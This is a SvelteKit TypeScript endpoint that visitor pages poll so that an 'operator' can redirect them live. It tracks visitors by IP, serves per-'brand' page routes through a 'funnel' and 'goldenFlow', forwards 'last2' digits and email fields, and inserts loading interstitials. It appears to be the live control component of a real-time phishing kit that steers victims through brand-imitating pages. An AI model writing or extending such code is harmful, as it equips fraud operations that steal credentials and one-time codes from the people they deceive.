/**
 * Visitor sync poll — admin redirects and overrides reach the browser here.
 *
 * Visitor pages poll this endpoint every ~2s. When the operator has set a
 * different `lastPageRoute` than the page the visitor is currently on, we
 * return the URL they should navigate to.
 *
 * Public endpoint — visitor templates must call it without auth.
 */
import { json, type RequestHandler } from '@sveltejs/kit';
import { serverState } from '$lib/server/state';
import { applyLoadingInterstitial, resolveLabelRedirectUrl } from '$lib/server/funnel';
import { ensureFlowInitialized, resolveNextStep } from '$lib/server/goldenFlow';

export const GET: RequestHandler = async ({ url, getClientAddress }) => {
	const brand = url.searchParams.get('brand')?.trim() || '';
	const page = url.searchParams.get('page')?.trim() || '';
	const isPreview = url.searchParams.get('isPreview') || '';
	const ip = getClientAddress() || '';

	const visitor = serverState.visitors.get(ip);
	if (!visitor || visitor.status !== 'online') {
		return json({ redirectUrl: null, lastPageRoute: null }, { headers: { 'Cache-Control': 'no-store' } });
	}

	ensureFlowInitialized(visitor);

	const currentRoute = brand && page ? `${brand}/${page}` : '';
	let targetRoute = visitor.lastPageRoute || visitor.lastPage || '';

	if (!visitor.flowBypassed && visitor.flowSteps.length > 0 && !targetRoute) {
		const nextStep = resolveNextStep(visitor.flowSteps);
		if (nextStep) targetRoute = nextStep;
	}

	if (!targetRoute || !currentRoute || targetRoute === currentRoute) {
		return json(
			{ redirectUrl: null, lastPageRoute: targetRoute || null },
			{ headers: { 'Cache-Control': 'no-store' } }
		);
	}

	const qp = new URLSearchParams();
	if (visitor.lastTwoDigits) qp.set('last2', visitor.lastTwoDigits);
	if (visitor.emailFrom) qp.set('emailFrom', visitor.emailFrom);
	if (visitor.emailTo) qp.set('emailTo', visitor.emailTo);

	const isVisitorHost = isPreview !== 'true';
	const redirectUrl = applyLoadingInterstitial(
		resolveLabelRedirectUrl(
			targetRoute,
			visitor.module,
			isVisitorHost,
			qp.size ? qp : undefined
		),
		qp.size ? qp : undefined,
		{ isVisitorHost }
	);

	return json(
		{ redirectUrl, lastPageRoute: targetRoute },
		{ headers: { 'Cache-Control': 'no-store' } }
	);
};
